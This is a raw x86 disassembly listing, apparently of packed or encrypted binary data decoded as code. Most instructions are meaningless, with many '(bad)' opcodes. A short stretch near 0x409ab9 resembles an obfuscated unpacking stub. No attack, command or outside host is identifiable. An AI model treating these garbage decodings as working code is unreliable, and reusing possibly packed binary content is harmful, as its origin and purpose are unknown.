  40971e:	rcl    dl,1
  409720:	pop    ss
  409721:	push   eax
  409722:	pop    eax
  409723:	jle    0x409788
  409725:	xor    BYTE PTR [ecx+eiz*4+0x78734fab],ch
  40972c:	ds in  eax,0xa9
  40972f:	and    ebx,DWORD PTR [edi]
  409731:	outs   dx,BYTE PTR ds:[esi]
  409732:	sub    BYTE PTR [eax],bh
  409734:	sbb    BYTE PTR gs:[ebx+0x218b8b4f],cl
  40973b:	pop    esp
  40973c:	pop    ss
  40973d:	push   es
  40973e:	inc    eax
  40973f:	push   cs
  409740:	mov    ds:0x438b84ac,eax
  409745:	jle    0x409792
  409747:	arpl   WORD PTR [ecx-0x7e00bef4],dx
  40974d:	xchg   esp,eax
  40974e:	loop   0x40974f
  409750:	push   esi
  409751:	add    BYTE PTR [edi-0x7e],0x6b
  409755:	stc    
  409756:	imul   ebp,ebp,0xbc7a8d5b
  40975c:	in     eax,0xd3
  40975e:	daa    
  40975f:	pop    es
  409760:	daa    
  409761:	jnp    0x4096e8
  409763:	xor    eax,0x71791aa2
  409768:	mov    bh,0xac
  40976a:	mov    ds:0xbb1824e3,al
  40976f:	sbb    esi,ebx
  409771:	imul   eax,DWORD PTR [ebx],0x2a3e70fd
  409777:	test   DWORD PTR [eax+0x1d576eb8],0x6761560e
  409781:	(bad)  
  409782:	loope  0x4097ef
  409784:	in     al,0xd1
  409786:	aad    0x84
  409788:	ds and al,0x7b
  40978b:	lods   al,BYTE PTR ds:[esi]
  40978c:	test   DWORD PTR [edi+0x1e],ebx
  40978f:	mov    dl,0x6c
  409791:	aas    
  409792:	push   0x2bbf8fd4
  409797:	or     al,0x2a
  409799:	les    esi,FWORD PTR [edi]
  40979b:	or     eax,0xe264060d
  4097a0:	mov    esp,0x680bb12e
  4097a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4097a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4097a7:	mov    eax,0x11272628
  4097ac:	jmp    0xf317:0x1364bdee
  4097b3:	sub    bl,dh
  4097b5:	mov    eax,ebp
  4097b7:	cwde   
  4097b8:	pop    eax
  4097b9:	mov    eax,0x5b04d5c3
  4097be:	push   esp
  4097c0:	outs   dx,DWORD PTR ds:[esi]
  4097c1:	add    BYTE PTR [edi+ebp*8+0x249f4274],ah
  4097c8:	shl    BYTE PTR [eax-0x77a37dfa],cl
  4097ce:	sub    bl,BYTE PTR [ecx]
  4097d0:	lahf   
  4097d1:	mov    WORD PTR [eax+esi*8+0x6a],?
  4097d5:	xchg   ebx,eax
  4097d6:	int    0x41
  4097d8:	call   0xcb41b3b
  4097dd:	inc    ebx
  4097de:	lods   al,BYTE PTR gs:[esi]
  4097e0:	dec    edx
  4097e1:	mov    esp,0x3776120b
  4097e6:	in     al,0x30
  4097e8:	or     DWORD PTR [esi-0x1d],0xdb49f166
  4097ef:	push   ds
  4097f0:	jo     0x409776
  4097f2:	loope  0x40980e
  4097f4:	shl    bl,cl
  4097f6:	les    edx,FWORD PTR [edi+0x536259bd]
  4097fc:	xlat   BYTE PTR ds:[ebx]
  4097fd:	sub    esi,DWORD PTR [esi-0x46908e6f]
  409803:	mov    eax,0x2b645299
  409808:	fsin   
  40980a:	dec    edx
  40980b:	pop    eax
  40980c:	ja     0x409842
  40980e:	adc    ebx,DWORD PTR [eax+0x47]
  409811:	adc    BYTE PTR [edi-0x2],dl
  409814:	jecxz  0x4097d6
  409816:	pop    es
  409817:	rcr    BYTE PTR [edx-0x3c],cl
  40981a:	ret    
  40981b:	retf   0xf752
  40981e:	mov    gs,WORD PTR [esi+edx*4-0x76]
  409822:	pop    ebp
  409823:	or     eax,0xaa65f842
  409828:	xchg   ecx,eax
  409829:	test   DWORD PTR [ecx-0x56],0x364cd76a
  409830:	stc    
  409831:	mov    bh,0x2e
  409833:	or     BYTE PTR [ebp-0x7ed6699],dl
  409839:	mov    bh,0x6e
  40983b:	jp     0x409881
  40983d:	add    al,0xb8
  40983f:	ins    BYTE PTR es:[edi],dx
  409840:	inc    eax
  409841:	or     dh,ah
  409843:	inc    edx
  409844:	daa    
  409845:	rcl    cl,1
  409847:	out    dx,al
  409848:	ret    
  409849:	push   esi
  40984a:	lods   al,BYTE PTR ds:[esi]
  40984b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40984c:	ror    cl,0xb7
  40984f:	fsub   DWORD PTR ds:0x30768ff8
  409855:	mov    al,ds:0x89b0b6c
  40985a:	pop    eax
  40985b:	sti    
  40985c:	adc    eax,0xb65ed578
  409861:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409862:	jg     0x40983a
  409864:	push   0x91ae58ac
  409869:	xchg   ecx,eax
  40986a:	fwait
  40986b:	and    al,0x65
  40986d:	cdq    
  40986e:	aad    0x4b
  409870:	sub    BYTE PTR ds:[edi],ah
  409873:	sub    al,0x16
  409875:	or     ebx,DWORD PTR [edi+0x61]
  409878:	test   eax,0xfec11aa9
  40987d:	cmp    dh,ah
  40987f:	imul   eax,DWORD PTR [edx+0x35985c21],0x33
  409886:	mov    cl,BYTE PTR [ebx-0x33dbd3fb]
  40988c:	sbb    DWORD PTR [ebx+0x23319968],edx
  409892:	push   edi
  409893:	jge    0x409865
  409895:	test   al,0x7c
  409897:	adc    ch,BYTE PTR [eax+0x67]
  40989a:	div    DWORD PTR [esi+0x12d1ed99]
  4098a0:	pop    eax
  4098a1:	hlt    
  4098a2:	pavgw  mm0,QWORD PTR [edx-0x6e7e55c0]
  4098a9:	xlat   BYTE PTR ds:[ebx]
  4098aa:	push   esp
  4098ab:	test   DWORD PTR [esi+0x3],ebx
  4098ae:	add    al,0x75
  4098b0:	mov    al,0x59
  4098b2:	addr16 in al,0xd
  4098b5:	je     0x4098bb
  4098b7:	lods   eax,DWORD PTR ds:[esi]
  4098b8:	dec    edi
  4098b9:	scas   al,BYTE PTR es:[edi]
  4098ba:	out    0x7c,al
  4098bc:	test   DWORD PTR [edi],ebp
  4098be:	and    eax,0x931607d8
  4098c3:	and    eax,0x9ed9965c
  4098c8:	inc    edi
  4098c9:	stos   BYTE PTR es:[edi],al
  4098ca:	mov    edx,0x57c16b3f
  4098cf:	jns    0x40992d
  4098d1:	jo     0x409935
  4098d3:	rcr    DWORD PTR [edi-0x36b08083],1
  4098d9:	push   0xa2ff0955
  4098de:	test   eax,0xa52bbb89
  4098e3:	dec    edx
  4098e4:	cld    
  4098e5:	mov    esp,DWORD PTR [edi-0x4785edd9]
  4098eb:	jae    0x4098dc
  4098ed:	inc    ebp
  4098ee:	push   0x159b018c
  4098f3:	cmp    BYTE PTR [esi-0x23],ah
  4098f6:	or     eax,0xa1a75360
  4098fb:	or     al,0xe3
  4098fd:	push   0x3674c86c
  409902:	xchg   BYTE PTR [ecx-0x24e6a873],cl
  409908:	outs   dx,DWORD PTR ds:[esi]
  409909:	call   0x8944:0xa9f1fe39
  409910:	mov    al,0x36
  409912:	mov    eax,ds:0xeffcda9b
  409917:	stc    
  409918:	je     0x409975
  40991a:	push   ecx
  40991b:	pop    es
  40991c:	fdiv   st(6),st
  40991e:	cld    
  40991f:	mov    ecx,0xd503b6fe
  409924:	xchg   ebp,eax
  409925:	push   ss
  409926:	(bad)  
  409927:	xor    BYTE PTR [edx+0x39],ch
  40992a:	mov    dl,0x18
  40992c:	add    ah,BYTE PTR [esi+eiz*2+0xbf8b5ef]
  409933:	dec    esi
  409934:	xor    eax,0xf83ca6c4
  409939:	pop    ecx
  40993a:	add    ah,bl
  40993c:	push   esi
  40993d:	add    al,0x91
  40993f:	lock push edx
  409941:	dec    edi
  409942:	dec    ebx
  409943:	nop
  409944:	dec    ebp
  409945:	in     eax,dx
  409946:	ret    0xde6e
  409949:	inc    edi
  40994a:	leave  
  40994b:	jb     0x409934
  40994d:	call   0xf74b:0x81faece4
  409954:	int3   
  409955:	inc    esp
  409956:	mov    dh,0x3e
  409958:	and    ch,dl
  40995a:	jecxz  0x4098f3
  40995c:	or     al,0x6d
  40995e:	jl     0x409921
  409960:	fbld   TBYTE PTR [edi-0x5c049c6c]
  409966:	jo     0x4099b0
  409968:	scas   al,BYTE PTR es:[edi]
  409969:	push   di
  40996b:	cmp    cl,ah
  40996d:	mov    DWORD PTR [ecx-0x35],esi
  409970:	ins    DWORD PTR es:[edi],dx
  409971:	(bad)  
  409972:	sbb    al,0x2c
  409974:	pop    edx
  409975:	jno    0x40993e
  409977:	test   al,0xf5
  409979:	xlat   BYTE PTR ds:[ebx]
  40997a:	(bad)  
  40997b:	dec    esp
  40997c:	adc    DWORD PTR [ecx-0x7b83fadb],edx
  409982:	lods   al,BYTE PTR ds:[esi]
  409983:	pop    ebx
  409984:	lds    ecx,FWORD PTR [ebx-0x1c93ca18]
  40998a:	imul   esi,DWORD PTR [esi+0x2b],0x97db21eb
  409991:	mov    ebx,0x515f034c
  409996:	dec    ecx
  409997:	rol    DWORD PTR [ecx-0x36df5fc1],1
  40999d:	sbb    BYTE PTR ds:0x4a9b277b,al
  4099a3:	ins    DWORD PTR es:[edi],dx
  4099a4:	xchg   ebx,eax
  4099a5:	rol    BYTE PTR [edi-0x35],0xa0
  4099a9:	mov    ch,0xca
  4099ab:	mov    dl,0x1b
  4099ad:	rcl    DWORD PTR [eax+0x61],0x71
  4099b1:	aaa    
  4099b2:	clc    
  4099b3:	and    edx,DWORD PTR [edx]
  4099b5:	mov    ah,0x3d
  4099b7:	mov    bl,0x7a
  4099b9:	repz push edi
  4099bb:	cmp    DWORD PTR [ecx],edi
  4099bd:	fisttp DWORD PTR fs:[eax+0x52]
  4099c1:	dec    esp
  4099c2:	dec    BYTE PTR [esi]
  4099c4:	inc    eax
  4099c5:	xor    ah,bh
  4099c7:	and    esp,DWORD PTR [eax+eax*8+0xd]
  4099cb:	shl    DWORD PTR [esi],1
  4099cd:	ins    BYTE PTR es:[edi],dx
  4099ce:	clc    
  4099cf:	test   eax,0x8848bc0e
  4099d4:	mov    ebp,0xa00d6c31
  4099d9:	adc    BYTE PTR cs:[ebp+0x47],cl
  4099dd:	xlat   BYTE PTR ds:[ebx]
  4099de:	imul   ebx,DWORD PTR [eax+0x755b94fe],0x39603628
  4099e8:	jo     0x4099e8
  4099ea:	out    0x61,al
  4099ec:	xchg   ecx,eax
  4099ed:	fcom   st(4)
  4099ef:	ja     0x4099ee
  4099f1:	aam    0x76
  4099f3:	nop
  4099f4:	xor    edx,DWORD PTR ds:0x682e3fdd
  4099fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4099fb:	lahf   
  4099fc:	std    
  4099fd:	pop    ebp
  4099fe:	retf   
  4099ff:	and    DWORD PTR [ebx+0x3dcfda0c],esi
  409a05:	xchg   esi,eax
  409a06:	and    ebx,DWORD PTR [edi+0x153d2233]
  409a0c:	adc    dl,BYTE PTR [edx+0x3ca33c77]
  409a12:	xor    ch,BYTE PTR [eax+esi*2-0x5a]
  409a16:	mov    esi,0xf1c4bbdc
  409a1b:	or     BYTE PTR ds:0xe9dd5206,al
  409a21:	jo     0x409a25
  409a23:	mov    al,ds:0x78e9eed9
  409a28:	ja     0x4099bd
  409a2a:	cmp    edi,DWORD PTR [ebx]
  409a2c:	aam    0x25
  409a2e:	pop    ss
  409a2f:	das    
  409a30:	inc    eax
  409a31:	sub    DWORD PTR [ebx],ebx
  409a33:	push   es
  409a34:	add    BYTE PTR ds:0xca09d361,ah
  409a3a:	sar    DWORD PTR [edi-0x2872e892],0x24
  409a41:	shl    ecx,cl
  409a43:	out    dx,al
  409a44:	rcl    BYTE PTR [edx+0x5b],0x98
  409a48:	jns    0x409abb
  409a4a:	rcl    BYTE PTR [eax],0x2
  409a4d:	in     al,dx
  409a4e:	push   eax
  409a4f:	stos   BYTE PTR es:[edi],al
  409a50:	test   ebx,ecx
  409a52:	(bad)  
  409a53:	mov    ch,0xa1
  409a55:	scas   al,BYTE PTR es:[edi]
  409a56:	or     BYTE PTR ds:0xedcfdcfb,ch
  409a5c:	fdivr  QWORD PTR [edx+eiz*8-0x17]
  409a60:	and    cl,dh
  409a62:	mov    bl,0x8b
  409a64:	jg     0x4099f5
  409a66:	into   
  409a67:	adc    eax,0xfda1ce38
  409a6c:	test   DWORD PTR [ebp-0x7a7c90c7],0x83aa11e4
  409a76:	cwde   
  409a77:	fs pop eax
  409a79:	sar    DWORD PTR [edi],cl
  409a7b:	in     al,0x2
  409a7d:	xchg   BYTE PTR [edx],dl
  409a7f:	inc    ebp
  409a80:	stc    
  409a81:	arpl   WORD PTR [eax-0x29bb0fbe],sp
  409a87:	rol    BYTE PTR [edx],1
  409a89:	dec    edi
  409a8a:	jge    0x409a6d
  409a8c:	retf   0xfdeb
  409a8f:	adc    ah,dh
  409a91:	mov    cs,WORD PTR [edi-0x6de9229d]
  409a97:	mov    ah,0x53
  409a99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a9a:	fwait
  409a9b:	and    DWORD PTR [esi-0x25],esp
  409a9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a9f:	jmp    0xd638:0xe6233aa1
  409aa6:	out    dx,al
  409aa7:	push   ds
  409aa8:	xchg   esi,eax
  409aa9:	pop    ecx
  409aaa:	jmp    0x3a102c0c
  409aaf:	ficom  WORD PTR [ebp-0x15]
  409ab2:	push   0x9afae7ab
  409ab7:	cs push esi
  409ab9:	mov    ecx,DWORD PTR ds:0x422008
  409abf:	add    ecx,DWORD PTR ds:0x420e82
  409ac5:	mov    DWORD PTR ds:0x422008,ecx
  409acb:	mov    esi,0xf89c85b5
  409ad0:	mov    DWORD PTR [ebp-0xc],esi
  409ad3:	mov    edx,DWORD PTR ds:0x420f34
  409ad9:	mov    ecx,DWORD PTR ds:0x42301c
  409adf:	sub    ecx,edx
  409ae1:	sub    edx,DWORD PTR [edx+ecx*1]
  409ae4:	lea    eax,[ebp-0xc]
  409ae7:	or     ecx,edx
  409ae9:	mov    DWORD PTR [ebp-0x14],eax
  409aec:	mov    eax,DWORD PTR [ebp-0xc]
  409aef:	mov    edx,DWORD PTR [ebp-0x14]
  409af2:	sbb    DWORD PTR ds:0x420fa0,ebx
  409af8:	mov    ecx,0x7510896
  409afd:	xor    eax,ecx
  409aff:	add    eax,0x3272dd
  409b04:	mov    DWORD PTR [edx],eax
  409b06:	mov    edx,DWORD PTR ds:0x42201c
  409b0c:	sbb    DWORD PTR ds:0x420ef0,edx
  409b12:	mov    eax,ds:0x4242ad
  409b17:	mov    edx,DWORD PTR [ebp-0x4]
  409b1a:	sbb    DWORD PTR ds:0x420fac,0x420e82
  409b24:	mov    eax,DWORD PTR [eax]
  409b26:	or     DWORD PTR ds:0x420f08,0x422000
  409b30:	add    eax,DWORD PTR [edx]
  409b32:	push   edi
  409b33:	mov    DWORD PTR [ebp-0x8],eax
  409b36:	jmp    0x40beb0
  409b3b:	popa   
  409b3c:	dec    edi
  409b3d:	jmp    0x409b64
  409b3f:	mov    ebx,0xf1fba379
  409b44:	jnp    0x409bbc
  409b46:	js     0x409acc
  409b48:	btr    ebx,edi
  409b4b:	cmp    DWORD PTR [edx+edi*2],eax
  409b4e:	jp     0x409b69
  409b50:	pop    edi
  409b51:	jp     0x409bcd
  409b53:	mov    ch,0x7b
  409b55:	xchg   ch,ah
  409b57:	rol    BYTE PTR es:[edi],1
  409b5a:	ins    DWORD PTR es:[edi],dx
  409b5b:	and    BYTE PTR [esi+0x27],cl
  409b5e:	cmc    
  409b5f:	fiadd  WORD PTR cs:[esi-0xa]
  409b63:	push   esp
  409b64:	add    BYTE PTR [edi-0x5c0af071],dl
  409b6a:	mov    dl,BYTE PTR [ecx+ebx*4+0x50]
  409b6e:	addr16 or eax,0xd6b348b2
  409b74:	(bad)  
  409b75:	daa    
  409b76:	pop    ecx
  409b77:	test   al,0x45
  409b79:	daa    
  409b7a:	test   BYTE PTR [edx+0x2d],dl
  409b7d:	and    dh,bh
  409b7f:	add    DWORD PTR [ecx+0x7a0c6675],esp
  409b85:	sbb    esp,DWORD PTR [ebp-0x46]
  409b88:	wbinvd 
  409b8a:	mov    ah,0x13
  409b8c:	clc    
  409b8d:	dec    ch
  409b8f:	int    0xdb
  409b91:	cli    
  409b92:	fcomi  st,st(0)
  409b94:	push   0xd2256432
  409b99:	or     edi,esp
  409b9b:	sub    BYTE PTR [esp+ebp*8-0x6d],dh
  409b9f:	fs pusha 
  409ba1:	ja     0x409baa
  409ba3:	loop   0x409bf6
  409ba5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ba6:	jmp    0x7fe6:0xc905a45
  409bad:	adc    eax,DWORD PTR [ebp+ecx*4+0x17]
  409bb1:	outs   dx,DWORD PTR ds:[esi]
  409bb2:	out    0x1b,eax
  409bb4:	sub    ch,BYTE PTR [ebx-0x49]
  409bb7:	push   edx
  409bb8:	jb     0x409bf1
  409bba:	enter  0x690d,0xa4
  409bbe:	lahf   
  409bbf:	sub    DWORD PTR [edx+ecx*8-0x46],esi
  409bc3:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  409bc5:	fbstp  TBYTE PTR [ebp+0x2e]
  409bc8:	repnz pop ecx
  409bca:	stc    
  409bcb:	not    DWORD PTR [eax+0x463dba93]
  409bd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409bd2:	push   ecx
  409bd3:	sahf   
  409bd4:	xor    BYTE PTR [ebx-0xa],al
  409bd7:	gs aam 0x91
  409bda:	frstor [ebx]
  409bdc:	jae    0x409bee
  409bde:	stos   BYTE PTR es:[edi],al
  409bdf:	or     al,0xad
  409be1:	or     edi,ebx
  409be3:	xchg   edx,ecx
  409be5:	xlat   BYTE PTR ds:[ebx]
  409be6:	and    ebp,0x5764c92d
  409bec:	ret    
  409bed:	and    ebp,esp
  409bef:	retf   
  409bf0:	push   0x28
  409bf2:	or     BYTE PTR [ecx],cl
  409bf4:	mov    ah,0xe
  409bf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409bf7:	jle    0x409bf7
  409bf9:	push   esi
  409bfa:	xor    bh,BYTE PTR [edi]
  409bfc:	xor    ch,BYTE PTR [esi]
  409bfe:	inc    ebp
  409bff:	jmp    0x11d4d75a
  409c04:	stos   DWORD PTR es:[edi],eax
  409c05:	adc    ebx,ebx
  409c07:	scas   eax,DWORD PTR es:[edi]
  409c08:	or     BYTE PTR [ecx-0x1c],bl
  409c0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c0c:	aad    0xd
  409c0e:	cld    
  409c0f:	dec    esp
  409c10:	xchg   ebp,eax
  409c11:	les    edi,FWORD PTR [edi-0x77a0f8b7]
  409c17:	mov    ecx,0x6f298d79
  409c1c:	jle    0x409baa
  409c1e:	hlt    
  409c1f:	xchg   esp,eax
  409c20:	repnz ins BYTE PTR es:[edi],dx
  409c22:	lods   eax,DWORD PTR ds:[esi]
  409c23:	jbe    0x409c96
  409c25:	inc    ebx
  409c26:	pop    eax
  409c27:	xlat   BYTE PTR ds:[ebx]
  409c28:	lods   al,BYTE PTR ds:[esi]
  409c29:	fdiv   QWORD PTR ds:0xc1ef11e6
  409c2f:	add    eax,eax
  409c31:	pop    eax
  409c32:	mov    bh,0xfd
  409c34:	add    al,0x22
  409c36:	fstp   QWORD PTR [ebp-0x59]
  409c39:	test   DWORD PTR [ebp-0x51],0xaac65365
  409c40:	xchg   ebp,eax
  409c41:	pusha  
  409c42:	ins    DWORD PTR es:[edi],dx
  409c43:	ret    
  409c44:	imul   esp,DWORD PTR [eax+0x1d0ca01b],0xae878f7c
  409c4e:	add    BYTE PTR [esi+esi*1],dh
  409c51:	ror    DWORD PTR [edx-0x49d68cc],cl
  409c57:	fnstsw WORD PTR [esi-0x7b0c4435]
  409c5d:	out    dx,al
  409c5e:	das    
  409c5f:	sbb    eax,0xcde0c82e
  409c64:	sbb    al,0x24
  409c66:	daa    
  409c67:	cmp    dl,BYTE PTR [edi]
  409c69:	fsub   QWORD PTR [ecx-0x525a9f5f]
  409c6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c70:	jmp    FWORD PTR [eax-0x4e]
  409c73:	xor    eax,0x9247b52c
  409c78:	loopne 0x409cc4
  409c7a:	cmp    DWORD PTR ds:0x659da8f4,0xffffffc1
  409c81:	xchg   dh,bl
  409c83:	push   ebx
  409c84:	pushf  
  409c85:	jne    0x409ccc
  409c87:	mov    dl,0xf7
  409c89:	push   ebp
  409c8a:	mov    gs,WORD PTR [edx+0x12fa63ea]
  409c90:	xchg   BYTE PTR [ebx],cl
  409c92:	sbb    DWORD PTR [ebx-0x2eec7e19],edi
  409c98:	(bad)  
  409c99:	icebp  
  409c9a:	mov    bl,0x7e
  409c9c:	mov    cl,0xbc
  409c9e:	mov    ecx,0xfd28b23e
  409ca3:	jb     0x409cb1
  409ca5:	iret   
  409ca6:	mov    ds:0xb3904a2a,al
  409cab:	mov    WORD PTR [ebx],gs
  409cad:	jne    0x409ca0
  409caf:	daa    
  409cb0:	imul   edx,DWORD PTR [esi],0x1cb88e
  409cb6:	or     ecx,ebp
  409cb8:	call   0xde27:0x281cf34e
  409cbf:	(bad)  
  409cc0:	cdq    
  409cc1:	idiv   DWORD PTR [edx+0x772bb797]
  409cc7:	aad    0x25
  409cc9:	outs   dx,BYTE PTR ds:[esi]
  409cca:	sub    al,0x4e
  409ccc:	and    dh,BYTE PTR [ecx]
  409cce:	lods   al,BYTE PTR ds:[esi]
  409ccf:	cmp    al,BYTE PTR [edi-0x40d21787]
  409cd5:	add    edi,DWORD PTR [esp+ebx*2+0x3]
  409cd9:	fidiv  DWORD PTR [eax+ecx*4+0x1d]
  409cdd:	and    eax,0x9855c7fc
  409ce2:	scas   eax,DWORD PTR es:[edi]
  409ce3:	lds    esp,FWORD PTR [esp+ebx*1]
  409ce6:	or     esp,DWORD PTR [eax-0x1f69040c]
  409cec:	out    0x6d,eax
  409cee:	test   DWORD PTR [edi-0x42],ebp
  409cf1:	dec    esp
  409cf2:	div    BYTE PTR [esi+ebx*4]
  409cf5:	add    al,0x46
  409cf7:	mov    ds:0x592bcc6d,al
  409cfc:	cmp    dl,bl
  409cfe:	push   ebp
  409cff:	mov    bl,ah
  409d01:	jge    0xa1516feb
  409d07:	sbb    BYTE PTR [ecx-0x1e8841c6],cl
  409d0d:	sbb    eax,0x34b9e79d
  409d12:	pop    eax
  409d13:	pop    ebp
  409d14:	jo     0x409d71
  409d16:	add    edx,eax
  409d18:	popa   
  409d19:	je     0x409d32
  409d1b:	mov    DWORD PTR [esi-0x45],ebp
  409d1e:	inc    DWORD PTR [ebp+0x299b1b62]
  409d24:	inc    ecx
  409d25:	xchg   DWORD PTR [ebx],esp
  409d27:	pushf  
  409d28:	fsubr  DWORD PTR [ebx-0x22]
  409d2b:	loopne 0x409d50
  409d2d:	push   esp
  409d2e:	jge    0x409d83
  409d30:	(bad)  
  409d31:	adc    al,0x5
  409d33:	jne    0x409d3c
  409d35:	adc    ecx,0xffffff80
  409d38:	xor    DWORD PTR [edi],esi
  409d3a:	mov    bh,0x3e
  409d3c:	jmp    0x87c53437
  409d41:	dec    edx
  409d42:	test   BYTE PTR [edi],bl
  409d44:	sbb    BYTE PTR [edi+ebp*8+0x60],0x28
  409d49:	push   ebp
  409d4a:	or     al,bl
  409d4c:	push   edi
  409d4d:	(bad)  
  409d4e:	loope  0x409d75
  409d50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d51:	or     ebp,edx
  409d53:	xlat   BYTE PTR ds:[ebx]
  409d54:	add    edi,DWORD PTR [edi+0x47]
  409d57:	rcr    dl,cl
  409d59:	je     0x409d6d
  409d5b:	dec    ebp
  409d5c:	inc    edi
  409d5d:	pop    ss
  409d5e:	xor    ebp,DWORD PTR [esi]
  409d60:	xchg   esp,eax
  409d61:	mov    eax,0xbd02f3b2
  409d66:	cmp    BYTE PTR [eax+0x1],dl
  409d69:	inc    ebp
  409d6a:	test   al,0x36
  409d6c:	scas   al,BYTE PTR es:[edi]
  409d6d:	pusha  
  409d6e:	fimul  WORD PTR [ebp+0x3a]
  409d71:	xchg   edi,eax
  409d72:	adc    al,0x84
  409d74:	mov    DWORD PTR [ebp-0x51008e93],edi
  409d7a:	sbb    eax,0x9c02f510
  409d7f:	mov    ah,0xc8
  409d81:	rol    DWORD PTR [edi+0xb],cl
  409d84:	ret    0x29ff
  409d87:	push   ebx
  409d88:	hlt    
  409d89:	daa    
  409d8a:	ror    dl,1
  409d8c:	mov    ss:0xe2bff2f1,eax
  409d92:	daa    
  409d93:	and    DWORD PTR [edi+0x6],ebx
  409d96:	popa   
  409d97:	clc    
  409d98:	ficom  WORD PTR [edx+0x26fc9228]
  409d9e:	popa   
  409d9f:	sbb    ebp,0xc0be3afd
  409da5:	call   FWORD PTR [edi-0x48]
  409da8:	(bad)
  409dad:	jno    0x409d58
  409daf:	push   ds
  409db0:	pusha  
  409db1:	xchg   ebx,eax
  409db2:	inc    edi
  409db3:	shr    DWORD PTR [esi+0x7f],0xd9
  409db7:	cli    
  409db8:	mov    esi,0xb7c45f7f
  409dbd:	sub    dl,BYTE PTR [ecx-0x7169e7fb]
  409dc3:	ins    BYTE PTR es:[edi],dx
  409dc4:	pop    esi
  409dc5:	inc    esi
  409dc6:	imul   eax,eax,0xffffff93
  409dc9:	gs int 0x1e
  409dcc:	aas    
  409dcd:	xchg   ebp,eax
  409dce:	ret    
  409dcf:	and    DWORD PTR [edi],0xffffffa4
  409dd2:	in     al,dx
  409dd3:	pop    edx
  409dd4:	(bad)  [esi-0x17]
  409dd7:	jae    0x409d70
  409dd9:	xor    eax,0xc0df9751
  409dde:	nop
  409ddf:	xchg   DWORD PTR [edx+0x2],ebp
  409de2:	mov    ebp,0xb66f807d
  409de7:	(bad)  
  409de8:	or     al,0x6b
  409dea:	pop    edi
  409deb:	fistp  WORD PTR [ebp+0xb]
  409dee:	mov    ds:0x55999fc5,al
  409df3:	jmp    0x409db7
  409df5:	shl    DWORD PTR ds:0x8cb1a392,1
  409dfb:	add    eax,0x641416d
  409e00:	xor    edi,0xb
  409e03:	mov    dh,0x19
  409e05:	mov    cl,0xb1
  409e07:	lods   al,BYTE PTR ds:[si]
  409e09:	dec    ebp
  409e0a:	call   0x536b31ec
  409e0f:	pop    ebx
  409e10:	lods   al,BYTE PTR ds:[esi]
  409e11:	jb     0x409def
  409e13:	(bad)  
  409e14:	popf   
  409e15:	sub    ch,BYTE PTR [eax-0x36b4ab13]
  409e1b:	add    ebx,DWORD PTR [ebx]
  409e1d:	cmp    ch,al
  409e1f:	sbb    al,dh
  409e21:	push   edi
  409e22:	scas   al,BYTE PTR es:[edi]
  409e23:	int    0xb7
  409e25:	xlat   BYTE PTR ds:[ebx]
  409e26:	fsub   DWORD PTR [edi-0xa]
  409e29:	std    
  409e2a:	imul   BYTE PTR [esi-0x721d5d26]
  409e30:	xor    dh,BYTE PTR [eax]
  409e32:	inc    esi
  409e33:	dec    ebx
  409e34:	ret    0x91bb
  409e37:	mov    edx,0xd6104b1b
  409e3c:	ins    BYTE PTR es:[edi],dx
  409e3d:	pushf  
  409e3e:	cmp    ch,BYTE PTR [ecx]
  409e40:	adc    eax,0x1b719e2d
  409e45:	jp     0x409ddf
  409e47:	nop
  409e48:	push   ebx
  409e49:	cmp    ebp,DWORD PTR [edi+0x22]
  409e4c:	push   ebx
  409e4d:	pop    ebp
  409e4e:	cmp    DWORD PTR [edx+0x6b10d66e],esp
  409e54:	adc    eax,0x27ce212
  409e59:	shl    DWORD PTR [eax+0x43c57472],1
  409e5f:	lock leave 
  409e61:	inc    ecx
  409e62:	cwde   
  409e63:	sbb    eax,0xbfb57643
  409e68:	add    DWORD PTR [eax-0x70a597f4],esp
  409e6e:	and    al,0x3a
  409e70:	mov    DWORD PTR [esi+0x62],edx
  409e73:	jbe    0x409df9
  409e75:	hlt    
  409e76:	test   eax,0xb54f8eea
  409e7b:	in     al,dx
  409e7c:	mov    ebx,0x5179d7f6
  409e81:	push   eax
  409e82:	ret    0x7832
  409e85:	pushf  
  409e86:	imul   esi,esi,0x42ffb997
  409e8c:	mov    cl,BYTE PTR [edi]
  409e8e:	popa   
  409e8f:	dec    ebp
  409e90:	jg     0x409eca
  409e92:	sbb    ah,dh
  409e94:	cmp    al,0xf8
  409e96:	inc    eax
  409e97:	xor    esi,edx
  409e99:	jmp    0x409ee7
  409e9b:	jmp    0x78eb4088
  409ea0:	js     0x409e55
  409ea2:	aam    0x9b
  409ea4:	or     edx,DWORD PTR [ebp-0x7e28e16a]
  409eaa:	pop    ss
  409eab:	mov    ah,BYTE PTR [edx+0x35a6e571]
  409eb1:	push   ds
  409eb2:	or     DWORD PTR [edx],ebx
  409eb4:	pop    ebp
  409eb5:	call   0xf4d1:0x1e0d69de
  409ebc:	(bad)  
  409ebd:	movups xmm7,XMMWORD PTR [eax]
  409ec0:	jp     0x409ed3
  409ec2:	or     cl,dh
  409ec4:	or     al,0x95
  409ec6:	sti    
  409ec7:	pop    fs
  409ec9:	aad    0xa0
  409ecb:	in     al,0x54
  409ecd:	mov    ch,0xf7
  409ecf:	es mov esi,0x5e4c4dc0
  409ed5:	int3   
  409ed6:	mov    ecx,DWORD PTR [ecx-0xe]
  409ed9:	inc    edx
  409eda:	or     BYTE PTR [esi-0x290dac0b],0xd7
  409ee1:	rcr    DWORD PTR ds:0x30eb519,cl
  409ee7:	or     DWORD PTR ds:0xaabef5cc,0x6c16634c
  409ef1:	xchg   esi,eax
  409ef2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ef3:	clc    
  409ef4:	xor    ebp,edx
  409ef6:	das    
  409ef7:	cld    
  409ef8:	out    dx,al
  409ef9:	addr16 xchg ebp,eax
